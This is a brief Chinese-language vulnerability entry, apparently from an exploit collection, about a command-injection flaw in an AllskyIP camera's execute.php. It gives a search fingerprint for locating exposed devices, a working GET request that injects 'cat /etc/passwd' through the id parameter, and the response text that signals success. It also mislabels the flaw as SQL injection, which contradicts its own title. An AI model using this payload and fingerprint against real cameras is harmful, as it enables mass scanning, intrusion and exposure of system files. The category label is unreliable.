# AllskyIP摄像头execute存在路径穿越导致命令注入漏洞

AllskyIP ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-1842970372"`
- **请求**：`GET /execute.php?id=allsky-config%20cat%20/etc/passwd HTTP/1.1`
- **响应特征**：200 Root: